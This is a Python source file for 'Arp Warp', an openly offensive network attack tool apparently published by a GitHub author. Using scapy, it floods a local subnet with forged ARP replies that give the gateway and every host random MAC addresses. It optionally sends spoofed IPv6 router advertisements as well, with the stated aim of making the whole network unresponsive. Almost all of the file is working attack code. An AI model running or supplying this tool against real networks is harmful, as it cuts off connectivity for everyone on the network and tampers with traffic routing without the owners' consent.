#!/usr/bin/env python3

import traceback
import ipaddress
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from utils import *

conf.verb = 0

#   --------------------------------------------------------------------------------------------------------------------
#
#   Arp Warp attack - Continuously poison the ARP + ND cache of all hosts on the connected network
#   to make it unresponsive
#
#   Ⓒ by https://github.com/flashnuke Ⓒ
#
#   --------------------------------------------------------------------------------------------------------------------


class ArpWarp:
    _P_TIMEOUT = 2
    _P_RETRY = 10
    _IPV6_REFHOSTS_INTV = 5

    def __init__(self, iface, cidrlen, s_time, gateway, spoof_ipv6nd, ipv6_preflen, ipv6hosts_filepath):
        self.network_interface = iface
        self.arp_poison_interval = s_time
        self.ipv6_preflen = ipv6_preflen or IPV6_PREFLEN
        self.ipv6_user_hosts = self.load_user_ipv6_hosts(ipv6hosts_filepath)

        conf.iface = self.network_interface
        self.cidrlen_ipv4 = cidrlen

        self.spoof_ipv6nd = spoof_ipv6nd
        if self.spoof_ipv6nd and os_is_windows():
            raise Exception("IPv6 ND spoofing is currently not supported for windows OS")

        self.my_private_ip = get_if_addr(self.network_interface)
        self.my_mac = get_if_hwaddr(self.network_interface)
        self.my_private_ipv6 = mac2ipv6_ll(self.my_mac, IPV6_LL_PREF)

        self.subnet_ipv4 = self.my_private_ip.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidrlen_ipv4}"

        self.gateway_ipv4 = gateway or self.get_gateway_ipv4(self.network_interface)
        self.gateway_mac = getmacbyip(self.gateway_ipv4)
        self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)

        if not self.gateway_mac:
            raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ipv4}")

        self.print_settings()

        self.host_ipv4s = [str(host_ip) for host_ip in ipaddress.IPv4Network(self.subnet_ipv4_sr) if
                           str(host_ip) != self.my_private_ip and str(host_ip) != self.gateway_ipv4]
        print(f"[*] Generated {len(self.host_ipv4s)} possible IPV4 hosts")
        if self.spoof_ipv6nd:
            print(f"[*] IPv6 ND spoof is enabled, setting up...")
            print("[*] Pinging IPv6 subnet for hosts...")
            self.host_ipv6s = self.get_all_hosts_ipv6()
            print(f"[*] Found {len(self.host_ipv6s)} IPv6 hosts")
        else:
            print(f"[*] IPv6 ND spoof is disabled, skipping ping6...")

        self.abort = False

    def print_settings(self):
        print("- net iface" + self.network_interface.rjust(38))
        print("- sleep time" + str(self.arp_poison_interval).rjust(32) + "[sec]")
        print("- IPv4 subnet" + self.subnet_ipv4_sr.rjust(36))
        print("- IPv4 gateway" + self.gateway_ipv4.rjust(35))
        print("- IPv6 gateway" + self.gateway_ipv6.rjust(35))
        print("- IPv6 preflen" + str(self.ipv6_preflen).rjust(35))
        print("- spoof IPv6 ND" + str(self.spoof_ipv6nd).rjust(34))
        print(DELIM)

    def get_all_hosts_ipv6(self) -> Dict[str, Union[None, str]]:
        ipv6_hosts = dict()
        ipv6_hosts.update(self.ipv6_user_hosts)
        try:
            ping_output = subprocess.check_output(['ping6', '-I', self.network_interface,
                                                   IPV6_MULTIC_ADDR, "-c", "3"], stderr=subprocess.DEVNULL).decode()
            for line in ping_output.splitlines():
                s_idx = line.find(IPV6_LL_PREF)
                e_idx = line.find(f"%{self.network_interface}")
                if s_idx > 0 and e_idx > 0:
                    host = line[s_idx:e_idx]
                    if host not in ipv6_hosts:
                        ipv6_hosts[host] = in6_addrtomac(host)  # returns None on fail
            # print("@", ipv6_hosts)
            # print("!", self.gateway_ipv6)  # TODO check if this is in above
        except Exception:
            pass
        return ipv6_hosts

    def refresh_ipv6_hosts(self):
        self.ipv6_user_hosts.update(self.get_all_hosts_ipv6())

    def poison_arp(self):
        """
        * poison the gateway arp cache with a spoofed mac address for every possible host
        * poison every possible host with a spoofed mac address for the gateway
        """
        for host_ip in self.host_ipv4s:
            # poison gateways's arp cache
            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ipv4)
            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)

            # poison host's arp cache
            arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)

    def poison_ra(self):
        """
        * send every host a spoofed RA packet with a fake MAC, using the routers lladdr  # todo test
        """
        for host_lladdr, host_hwaddr in self.host_ipv6s.items():
            rand_mac = RandMAC()
            ether_packet = Ether(src=rand_mac, dst=host_hwaddr) if host_hwaddr else Ether(src=rand_mac)
            spoofed_ra = ether_packet / \
                         IPv6(src=self.gateway_ipv6, dst=host_lladdr) / \
                         ICMPv6ND_RA() / \
                         ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
                         ICMPv6NDOptMTU() / \
                         ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
            sendp(spoofed_ra, iface=self.network_interface)

    def start_attack(self):
        loop_count = 0
        print(DELIM)
        if os_is_linux():
            print("")
            print("")
        while not self.abort:
            try:
                loop_count += 1
                now = get_ts_ms()
                self.poison_arp()
                if self.spoof_ipv6nd:
                    if not loop_count % ArpWarp._IPV6_REFHOSTS_INTV:  # periodically refresh IPv6 hosts
                        self.refresh_ipv6_hosts()
                    self.poison_ra()
                if os_is_linux():
                    print(2 * "\x1b[1A\x1b[2K")
                print(f"[+] attacking..." + f"cycle #{str(loop_count)} duration {get_ts_ms() - now}[ms]".rjust(33))

                time.sleep(self.arp_poison_interval)
            except Exception as exc:
                print(DELIM)
                print(f"[!] Exception caught -> {exc}")
                print(traceback.format_exc())
                self.abort = True
            except KeyboardInterrupt:
                print(DELIM)
                print(f"[-] User requested to stop...")
                self.abort = True

    @staticmethod
    def get_gateway_ipv4(iface):
        try:
            return [r[2] for r in conf.route.routes if r[3] == iface and r[2] != '0.0.0.0'][0]
        except Exception:
            raise Exception(f"[!] Unable to IPv4 gateway, try setting manually by passing (-g, --set-gateway)...")

    @staticmethod
    def load_user_ipv6_hosts(filepath) -> Dict[str, str]:
        return {lladdr: in6_addrtomac(lladdr) for lladdr in load_hostlist(filepath)} if filepath else dict()


if __name__ == "__main__":
    print(f"\n{BANNER}\nWritten by @flashnuke")
    print(DELIM)

    arguments = define_args()
    warper = ArpWarp(arguments.iface, arguments.cidrlen, arguments.s_time, arguments.gateway,
                     arguments.spoof_ipv6nd, arguments.preflen, arguments.ipv6hosts_filepath)
    warper.start_attack()
